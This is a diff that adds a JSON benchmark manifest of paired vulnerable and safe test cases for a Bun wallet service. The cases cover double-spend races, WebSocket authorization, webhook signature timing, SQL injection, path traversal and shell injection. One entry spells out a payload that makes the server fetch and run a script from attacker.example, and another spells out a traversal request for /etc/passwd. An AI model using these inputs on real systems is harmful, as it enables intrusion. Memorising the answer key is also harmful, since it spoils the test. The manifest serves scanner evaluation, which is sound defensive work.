@@ -1,0 +1,334 @@
+{
+  "family": "bun-runtime",
+  "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+  "cases": [
+    {
+      "id": "h3-bun-runtime-withdrawal-debit",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/payouts/withdrawal-server.ts",
+      "scanAs": "apps/wallet-api/src/payouts/withdrawal-server.ts",
+      "kind": "vulnerable",
+      "category": "race_condition_double_spend",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 64,
+      "lineRange": [
+        49,
+        66
+      ],
+      "route": "POST /api/wallets/:walletId/withdrawals",
+      "runtimeVerifiable": true,
+      "why": "The balance is read and compared at line 49, then an awaited provider call at lines 54-58 gives up the event loop for a whole network round trip, and only afterwards is the wallet debited unconditionally at line 64. Two withdrawal requests for the same wallet issued together both pass the check and both debit, so the balance goes negative and the merchant is paid twice; nothing here is a transaction and the UPDATE carries no balance predicate.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-instant-payout",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/payouts/payout-server.ts",
+      "scanAs": "apps/wallet-api/src/payouts/payout-server.ts",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-withdrawal-debit",
+      "route": "POST /api/wallets/:walletId/payouts",
+      "runtimeVerifiable": true,
+      "why": "The debit and the sufficiency test are the same statement: the UPDATE carries `balance_cents >= $amount` in its WHERE clause and runs inside a bun:sqlite transaction that also inserts the hold, and the caller only proceeds when exactly one row changed. A concurrent second request updates zero rows, gets a 402, and the provider is only called once funds are already reserved.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-ledger-topic",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/realtime/wallet-stream.ts",
+      "scanAs": "apps/wallet-api/src/realtime/wallet-stream.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 74,
+      "lineRange": [
+        72,
+        77
+      ],
+      "runtimeVerifiable": true,
+      "why": "The `subscribe` branch joins the socket to `wallet:<walletId>` using only the wallet id the client sent; the regex at line 33 checks the id's shape but nothing checks that it belongs to `ws.data.subjectId`. Any signed-in dashboard session can subscribe to another merchant's wallet and receive every ledger posting `publishLedgerEvent` broadcasts for it. The `replay` branch in the same switch does call `assertWalletAccess`, which is what the subscribe branch is missing.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-balance-topic",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/realtime/balance-stream.ts",
+      "scanAs": "apps/wallet-api/src/realtime/balance-stream.ts",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-ledger-topic",
+      "runtimeVerifiable": true,
+      "why": "Every branch that widens what the socket can see runs `assertWalletAccess` against the identity captured on the socket at upgrade time before the wallet id is used, so subscribing to another merchant's balance topic and asking for its snapshot are both refused. Only `unsubscribe` skips the lookup, and unsubscribing can never grant access to anything.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-settlement-callback",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/routes/psp-webhook.ts",
+      "scanAs": "apps/wallet-api/src/routes/psp-webhook.ts",
+      "kind": "vulnerable",
+      "category": "timing_unsafe_comparison",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "line": 48,
+      "lineRange": [
+        44,
+        51
+      ],
+      "route": "POST /webhooks/psp/settlements",
+      "runtimeVerifiable": true,
+      "why": "The presented webhook signature is compared to the computed HMAC with `!==`, which short-circuits at the first differing character and so leaks how much of a guessed signature was correct. Because the caller controls the body and can replay the same request indefinitely, that side channel is a path to forging a `payout.settled` event, which is the one thing this endpoint's signature check exists to prevent. A constant-time comparison is required here.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-capture-callback",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/routes/acquirer-webhook.ts",
+      "scanAs": "apps/wallet-api/src/routes/acquirer-webhook.ts",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-settlement-callback",
+      "route": "POST /webhooks/acquirer/captures",
+      "runtimeVerifiable": true,
+      "why": "The comparison at line 44 is still `===`, but it operates on two keyed SHA-256 digests taken under a 32-byte nonce generated freshly for this request. The strings that meet the operator are unpredictable to the caller, so where they first differ carries no information about the real signature and the same body replayed twice produces unrelated pairs. This is the standard blinded (double-HMAC) comparison and it is not timing-exploitable.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-counterparty-filter",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/routes/transaction-search.ts",
+      "scanAs": "apps/wallet-api/src/routes/transaction-search.ts",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "line": 55,
+      "lineRange": [
+        54,
+        66
+      ],
+      "route": "GET /api/wallets/:walletId/transactions",
+      "runtimeVerifiable": true,
+      "why": "The dashboard's `q` parameter and the `walletId` path parameter are both interpolated into quoted SQL literals and the finished string is executed with `sql.unsafe(statement)` with no bindings at all. A single quote in `q` closes the literal, so the reporting role's whole search path is reachable - and although that role is read-only, the replica still holds every tenant's transactions.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-statement-filter",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "typescript",
+      "file": "bun-runtime/apps/wallet-api/src/routes/statement-lines.ts",
+      "scanAs": "apps/wallet-api/src/routes/statement-lines.ts",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-counterparty-filter",
+      "route": "GET /api/wallets/:walletId/statement-lines",
+      "runtimeVerifiable": true,
+      "why": "This route also assembles its predicate list dynamically and also finishes with `sql.unsafe`, but it passes a `bindings` array and the statement text only ever grows by `$n` placeholders: the wallet id, the search pattern, the period bound and the limit are all parameters. The interpolated sort column can only be a value from the frozen SORT_COLUMNS object, falling back to a constant, so no caller-controlled text reaches the parser.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-mandate-delivery",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "javascript",
+      "file": "bun-runtime/services/documents/src/server.js",
+      "scanAs": "services/documents/src/server.js",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 43,
+      "lineRange": [
+        40,
+        44
+      ],
+      "route": "GET /documents/*",
+      "runtimeVerifiable": true,
+      "why": "The tail of the request path is percent-decoded into `key` and joined straight onto the document root and tenant directory with no containment check, so `GET /documents/..%2f..%2f..%2fetc%2fpasswd` walks out of the tenant folder and off the volume entirely. The session check above establishes who the caller is but places no constraint on which file they name, so this also reads other tenants' mandates and KYC letters.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-receipt-delivery",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "javascript",
+      "file": "bun-runtime/services/documents/src/receipts.js",
+      "scanAs": "services/documents/src/receipts.js",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-mandate-delivery",
+      "route": "GET /receipts/*",
+      "runtimeVerifiable": true,
+      "why": "The decoded key is resolved against the tenant's own directory and the result is then required to be either the base itself or to start with the base plus a path separator, so `resolve` collapsing a `..` sequence is caught afterwards and a rejected key returns 404. The trailing separator in the comparison also stops a sibling directory whose name merely shares a prefix from being accepted.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-archive-password",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "javascript",
+      "file": "bun-runtime/services/statements/src/archive.js",
+      "scanAs": "services/statements/src/archive.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "line": 56,
+      "lineRange": [
+        54,
+        58
+      ],
+      "route": "POST /statements/:statementId/archive",
+      "runtimeVerifiable": true,
+      "why": "The caller-supplied `password` is placed inside single quotes in a command string that is then run by `/bin/sh -c`, and nothing escapes a single quote in the value. A password of `x'; curl http://attacker.example/s | sh; '` ends the quoted word and the shell executes the injected command as the service account. The only validation applied is a length range, which a payload easily satisfies.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    },
+    {
+      "id": "h3-bun-runtime-period-bundle",
+      "family": "bun-runtime",
+      "architecture": "Bun services: `Bun.serve` processes in apps/wallet-api (routes objects, regex dispatch and WebSocket handlers over Bun.sql and bun:sqlite) plus two standalone document/statement services under services/.",
+      "language": "javascript",
+      "file": "bun-runtime/services/statements/src/export.js",
+      "scanAs": "services/statements/src/export.js",
+      "kind": "safe",
+      "pairedWith": "h3-bun-runtime-archive-password",
+      "route": "POST /statements/periods/:period/export",
+      "runtimeVerifiable": true,
+      "why": "The shell command here is a compile-time constant and the three varying values are handed to the child through its environment, where the shell substitutes them as quoted parameter expansions after the command line has already been split into words. A quote or semicolon in the password is therefore just part of the argument `zip` receives and can never become shell syntax.",
+      "packageJson": {
+        "name": "wallet-platform",
+        "version": "2.9.0",
+        "private": true,
+        "type": "module",
+        "devDependencies": {
+          "@types/bun": "^1.2.4",
+          "typescript": "^5.7.3"
+        }
+      }
+    }
+  ]
+}
